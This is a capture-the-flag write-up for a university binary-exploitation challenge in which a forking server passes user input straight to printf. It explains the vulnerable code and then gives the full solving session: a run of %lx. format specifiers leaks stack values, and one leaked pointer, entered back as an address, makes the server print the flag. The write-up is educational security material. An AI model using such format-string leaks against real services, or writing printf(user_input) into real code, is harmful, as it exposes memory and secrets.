# HexMarksTheSpot Writeup
## Author: Fabio - Albran
## Category: Binary Exploitation
## Difficulty: Less Easy

### Challenge Description
Welcome aboard, do you have your map with you? Remember the (he)X marks the spot!

The challenge is structured a simple forking server with a `printf` vulnerability that allows us to leak the stack content. The server listens on port `10000`.
The goal is to retrieve the flag stored in a global variable named `TREASURE`.

The `data` structure contains is formatted as follows:

```c
struct data {
    char user_input[256];
    char flag[128];
}__attribute__((aligned(16));
```
Thus the `flag` variable is stored right after the `user_input` buffer in memory.
In the stack the address of the flag is scattered, so we need to reconstruct it by leaking the content of the stack.

The server initially asks for the name of the user the server prints a welcome message using `printf(user_input)`, allowing us to exploit the format string vulnerability.

After this, the server asks the user the address of the `TREASURE`, which is stored in a global variable randomly located in memory (the address changes for each connection).

The user can provide the address of the `TREASURE` variable in hexadecimal format (e.g., `0x7fffffdeadbeef`) and the server will read the content of that address and print it to the user; if the address is valid, the server will print the content of the `TREASURE` variable, which contains the flag.

### Solution
The address is scattered in the stack but the server does not clean all the variables so one can pass a few `%lx.` format specifiers to leak the top of the stack, which contains a pointer that when interpreted by the `strtoull` function will point to the `TREASURE` variable.

```
$ nc hex-marks-the-spot.unipi-ctf.it 10000
    Welcome aboard, do you have your map with you? Remember the (he)X marks the spot!:
    Who is asking permission to board the ship?
    %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.
    76cb85003963.fbad208b.7fff26cf3cc0.1.0.100026cf3d90.34.67fa9e2000.80.40000000.7fffffff000.6e05253e000.7ffbffff.6e01253e.6e05253e000.0.1d.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.

    Very well, do you know where the treasure is hidden? (Enter an address in hex format, e.g., 0xdeadbeef):
    0x67fa9e2000
    unipi{y0u_f0und_th3_tr34sur3_4lw4ys_l00k_f0r_th3_X!}
```


